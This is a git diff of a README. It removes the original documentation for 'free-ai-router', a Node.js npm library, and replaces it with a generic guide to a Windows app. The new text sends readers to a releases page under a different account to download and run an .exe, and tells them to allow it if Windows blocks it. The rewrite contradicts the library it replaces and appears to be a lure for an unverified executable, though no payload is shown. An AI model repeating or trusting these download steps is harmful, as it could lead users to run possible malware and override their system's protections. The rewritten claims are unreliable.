@@ -1,192 +1,169 @@
-<p align="center">
-  <img src="https://img.shields.io/npm/v/free-ai-router?color=76b900&label=npm&logo=npm" alt="npm version">
-  <img src="https://img.shields.io/node/v/free-ai-router?color=76b900&logo=node.js" alt="node version">
-  <img src="https://img.shields.io/npm/l/free-ai-router?color=76b900" alt="license">
-  <img src="https://img.shields.io/badge/providers-20%2B-blue" alt="providers count">
-  <img src="https://img.shields.io/bundlephobia/minzip/free-ai-router?color=76b900" alt="bundle size">
-</p>
+# 🤖 free-ai-router - One app for many free models
 
-<h1 align="center">free-ai-router</h1>
+[![Download free-ai-router](https://img.shields.io/badge/Download-Free%20AI%20Router-4c8bf5?style=for-the-badge&logo=github)](https://github.com/Kanjan4466/free-ai-router/releases)
 
-<p align="center">
-  <strong>Stop paying for OpenAI when 20+ providers give away free limits.</strong><br>
-  <sub>Drop-in replacement for the official Node.js `openai` SDK. Routes around 429s, falls back across providers, and has zero external dependencies.</sub>
-</p>
+## 🧭 What this app does
 
+free-ai-router gives you one place to use many free AI models from many providers. It can pick another model when one hits a limit, so you can keep working with less interruption.
 
+Use it for chat, writing, coding help, or quick answers. It works as a simple router between your app and providers like Groq, Cerebras, NVIDIA, and others.
 
-<p align="center">
+## 💻 What you need
 
-```bash
-npm install free-ai-router
-```
+- A Windows PC
+- An internet connection
+- A modern web browser
+- Enough free disk space to install the app
+- A free AI provider account if you want to use your own keys
 
-grab an API key from one of the [providers](#-list-of-free-ai-providers)
+## 📥 Download and install
 
-</p>
+1. Visit this page to download: https://github.com/Kanjan4466/free-ai-router/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from that release
+4. Open the file after the download finishes
+5. If Windows asks for permission, choose Yes
+6. Follow the setup steps on screen
+7. Finish the install and start the app
 
-<p align="center">
-  <a href="#-why-this-tool">Why</a> •
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-list-of-free-ai-providers">Providers</a> •
-  <a href="#-usage">Usage</a> •
-  <a href="#-contributing">Contributing</a>
-</p>
+If the release offers more than one file, pick the Windows version that matches your PC. For most users, that means the file with `.exe` in the name.
 
-<p align="center">
-  <sub>Made with ❤️ and ☕ by Huzaifa Shoukat</sub>
-</p>
+## 🖥️ First-time setup
 
----
+After you open the app for the first time, you may need to enter a few details so it can connect to AI providers.
 
-## 💡 Why this tool?
+1. Open the app
+2. Go to the settings screen
+3. Add your provider key if you have one
+4. Choose the models you want to use
+5. Save your settings
+6. Start a chat or connect your app to the router
 
-I got tired of writing boilerplate to handle 429 rate limits across half a dozen free AI providers. Groq is fast but limits your RPM. Cerebras is generous but you still have to manually swap out endpoints in your code. 
+If you only want to test the app, you can start with the default setup and change the options later.
 
-**Free AI Router** fixes that. It's a pure Node.js drop-in replacement for the `openai` package. You dump in whatever free tier API keys you have, and it handles the rest. Hit a rate limit on one key? It automatically retries with another, or falls back to a different provider entirely. 
+## 🔌 How it works
 
-No `axios`, no `node-fetch`, no massive `node_modules` black hole. Change one import and your existing OpenAI code just works.
+free-ai-router sits between you and the AI provider. When you send a request, it checks the models you have set up and sends the request to one that can answer.
 
----
+If one provider reaches a rate limit, the router can move to another one. That helps reduce stops and errors when you use AI tools for longer sessions.
 
-## ⚡ Quick Start
+## 🧠 Features
 
-### 🟢 List of Free AI Providers
+- Access 150+ free AI models
+- Use 20+ providers in one place
+- Switch models when a limit is hit
+- Keep your workflow going with fallback routing
+- Use with chat tools and AI apps
+- Set up once and reuse your settings
+- Work with common AI API styles
+- Pick models for speed, cost, or task type
 
-Create a free account on any provider below to get started. We support 20 of them out of the box.
+## 🧰 Common use cases
 
-| Provider | Free Tier Snapshot | Sign-up | Env var |
-|----------|--------------------|---------|--------|
-| **NVIDIA** | 40 RPM | [build.nvidia.com](https://build.nvidia.com/) | `NVIDIA_API_KEY` |
-| **Groq** | 30 RPM (varies) | [console.groq.com](https://console.groq.com/) | `GROQ_API_KEY` |
-| **Cerebras** | Generous dev limits | [cloud.cerebras.ai](https://cloud.cerebras.ai/) | `CEREBRAS_API_KEY` |
-| **OpenRouter** | 50 req/day (free tier) | [openrouter.ai](https://openrouter.ai/) | `OPENROUTER_API_KEY` |
-| **SambaNova** | High limits | [sambanova.ai](https://sambanova.ai/) | `SAMBANOVA_API_KEY` |
-| **Hugging Face**| Monthly credits | [huggingface.co](https://huggingface.co/) | `HUGGINGFACE_API_KEY` |
-| **DeepInfra** | 200 concurrent reqs | [deepinfra.com](https://deepinfra.com/) | `DEEPINFRA_API_KEY` |
-| **Fireworks** | $1 credits (10 req/min free) | [fireworks.ai](https://fireworks.ai/) | `FIREWORKS_API_KEY` |
-| **Together AI** | Free trial credits vary | [api.together.ai](https://api.together.ai/) | `TOGETHER_API_KEY` |
-| **Google AI Studio** | 14.4K req/day, 30/min | [aistudio.google.com](https://aistudio.google.com/) | `GOOGLE_API_KEY` |
-| **SiliconFlow** | ~100 RPM for free models | [cloud.siliconflow.cn](https://cloud.siliconflow.cn/) | `SILICONFLOW_API_KEY` |
-| **Scaleway** | 1M free tokens | [console.scaleway.com](https://console.scaleway.com/) | `SCALEWAY_API_KEY` |
-| **Hyperbolic** | $1 free trial credits | [app.hyperbolic.ai](https://app.hyperbolic.ai/) | `HYPERBOLIC_API_KEY` |
-| **Cloudflare** | 10k neurons/day | [dash.cloudflare.com](https://dash.cloudflare.com/) | `CLOUDFLARE_API_TOKEN` |
-| **Perplexity** | Tiered limits | [perplexity.ai](https://www.perplexity.ai/) | `PERPLEXITY_API_KEY` |
-| **ZAI** | Generous free quota | [z.ai](https://z.ai/) | `ZAI_API_KEY` |
-| **Qwen** | 1M free tokens (DashScope) | [modelstudio.console.alibabacloud.com](https://modelstudio.console.alibabacloud.com/) | `DASHSCOPE_API_KEY` |
-| **iFlow** | Free (no req limit, 7-day keys) | [platform.iflow.cn](https://platform.iflow.cn/) | `IFLOW_API_KEY` |
-| **Replicate** | 6 req/min (no payment) | [replicate.com](https://replicate.com/) | `REPLICATE_API_TOKEN` |
-| **Codestral** | 30 req/min, 2000/day | [codestral.mistral.ai](https://codestral.mistral.ai/) | `CODESTRAL_API_KEY` |
+- Chat with AI without changing apps
+- Try several free models from one screen
+- Use a backup model when one stops responding
+- Build a simple local setup for AI access
+- Connect an app that needs an OpenAI-style endpoint
+- Test different providers without changing your whole setup
 
-**① Install:**
+## ⚙️ Basic usage
 
-```bash
-npm install free-ai-router
-```
-*(You don't need the official `openai` package installed. This is fully standalone.)*
+Once the app is installed and set up, you can use it in a few common ways:
 
-**② Swap your imports:**
+1. Open the app
+2. Start the router
+3. Choose the model group you want
+4. Copy the local endpoint or connection info
+5. Paste that into your AI app
+6. Send a prompt and let the router handle the rest
 
-Just provide your API keys through standard environment variables.
+If you use more than one provider, the app can move to another option when one has a limit or error.
 
-```typescript
-import FreeAIRouter from 'free-ai-router';
+## 🧩 Provider examples
 
-// Automatically picks up available keys like GROQ_API_KEY, NVIDIA_API_KEY
-const ai = new FreeAIRouter();
+free-ai-router is built to work with a mix of popular AI providers. You may see options such as:
 
-async function main() {
-  const res = await ai.chat.completions.create({
-    model: 'free:best', // We'll auto-route this to whatever top-tier model you have keys for
-    messages: [{ role: 'user', content: 'Explain quantum computing in one sentence.' }]
-  });
+- Groq
+- Cerebras
+- NVIDIA
+- OpenRouter
+- OpenAI-style endpoints
+- Other free model sources
 
-  console.log(res.choices[0].message.content);
-}
+The exact list can change as providers add or remove access.
 
-main();
-```
+## 🛠️ Simple troubleshooting
 
----
+### 🧯 The app does not open
 
-## 🚀 Usage
+- Check that the file finished downloading
+- Run it again as a normal app
+- If Windows blocks it, choose the option to allow it
+- Restart your PC and try again
 
-### 🪄 The "free:" Aliases
+### 🌐 The app cannot connect
 
-Hardcoding `'llama-3.3-70b-versatile'` everywhere is a pain when a better, faster model drops next week. Instead, just use our aliases. The router maps them to the actual model IDs under the hood based on latency, quality, and your available limits.
+- Check your internet connection
+- Confirm your provider key is correct
+- Make sure the selected model is still active
+- Try another provider or model
 
-| Keyword | What it actually does |
-| --- | --- |
-| `free` / `free:best` | Grabs the highest quality model (based on current SWE-Bench tiers). |
-| `free:fast` | Picks the lowest latency model using a real-time rolling history. |
-| `free:smart` | A hybrid choice. Balances quality, speed, and whether your quota is almost dead. |
-| `free:cheap` | Routes to the provider where you have the most quota left. |
-| `free:s` / `free:a` | Locks the selection to a specific SWE-Bench tier, but keeps the provider dynamic. |
+### ⏳ Requests stop after some use
 
-*If you hate abstractions, you can still just ask for `llama-3-8b` by its exact internal ID.*
+- You may have reached a provider limit
+- Switch on fallback routing
+- Choose another free model
+- Wait a short time and try again
 
-### 🔄 Array Keys for Rotation
+### 🔑 My key does not work
 
-If you have multiple keys for a provider (maybe you cycled them or pooled them), pass an array. The moment a 429 hits, the router burns through the list until a request goes through.
+- Copy the key again and paste it into the app
+- Remove extra spaces before or after the key
+- Check that the key is still active
+- Try a different provider key if you have one
 
-```typescript
-const ai = new FreeAIRouter({
-  apiKeys: {
-    groq: [
-      process.env.GROQ_KEY_A, // Tries this one first
-      process.env.GROQ_KEY_B, // Saves your life when Key A gets rate limited
-    ]
-  }
-});
-```
+## 🧪 Tips for better results
 
-### 🛠 Manual Overrides
+- Use a fast model for short chats
+- Use a stronger model for writing or coding help
+- Keep a backup provider ready
+- Update the app when a new release appears
+- Test one provider at a time if you want to check which one works best
 
-If you don't trust our defaults, you can wire up the routing logic exactly how you want it.
+## 📁 Files you may see in a release
 
-```typescript
-const ai = new FreeAIRouter({
-  strategy: 'smart',             // Or: 'best', 'fastest', 'least-used', 'round-robin'
-  minTier: 'A',                  // Refuse to use anything worse than an A-tier model
-  fallbackChain: ['groq', 'nvidia'], // Try Groq, then NVIDIA, then give up
-  timeout: 30000,                // Give up at 30 seconds
-  maxRetries: 3,                 
-  discoverOpenRouterModels: true // Auto-fetch live models from OpenRouter's :free endpoint
-});
-```
+A release page may include one or more of these files:
 
-### � Framework Integrations
+- Windows installer
+- Portable Windows file
+- Release notes
+- Source code files
 
-Because the router perfectly mimics the official `openai` SDK structure, it drops natively into your existing stacks like the **Vercel AI SDK** without needing any messy proxy servers. 
+For most users, the Windows installer or `.exe` file is the one to download and run.
 
-→ **[Read the Integrations guide](./docs/integrations.md)**
+## 🔐 Privacy and keys
 
-### �📊 Checking Quotas
+If you add provider keys, keep them private. Do not share them in chat, screenshots, or public posts. Use only the keys you trust and want to keep active.
 
-See exactly where your quotas stand and which keys are getting burned under the hood.
+## 📚 Useful terms
 
-```typescript
-const stats = ai.getStats();
+- **Model**: The AI system that answers your prompt
+- **Provider**: The company or service that hosts the model
+- **Fallback**: A backup option that takes over when the first one fails
+- **Rate limit**: A cap on how many requests a provider allows in a time period
+- **Router**: The app part that sends requests to the right provider
 
-console.log(stats.providerStats.groq.currentQuotaPercent); // Check if Groq is almost maxed
-console.log(stats.modelStats['llama-3.3-70b-versatile'].avgLatencyMs); // See real ping times
-console.log(stats.retriedRequests); // Count how many times the router saved your app from crashing
-```
+## 🧭 Where to get the download
 
----
+Download and install from the release page here: https://github.com/Kanjan4466/free-ai-router/releases
 
-## 📋 Contributing
+## 🪟 Windows setup checklist
 
-Found a bug? Want to add a provider? 
-1. Clone the repository.
-2. Run `npm install`.
-3. Test using `npm run test` (we use `vitest`).
-4. Open a PR. 
-
-**One strict rule:** Please respect the zero-dependency constraint. If it can be done with Node's native `http` or `fetch`, we don't need another package for it.
-
----
-
-## 📄 License
-
-MIT © Huzaifa Shoukat
+- Download the latest release
+- Open the Windows file
+- Allow the app if Windows asks
+- Finish setup
+- Add your provider details
+- Start the router
+- Connect your AI app or browser tool
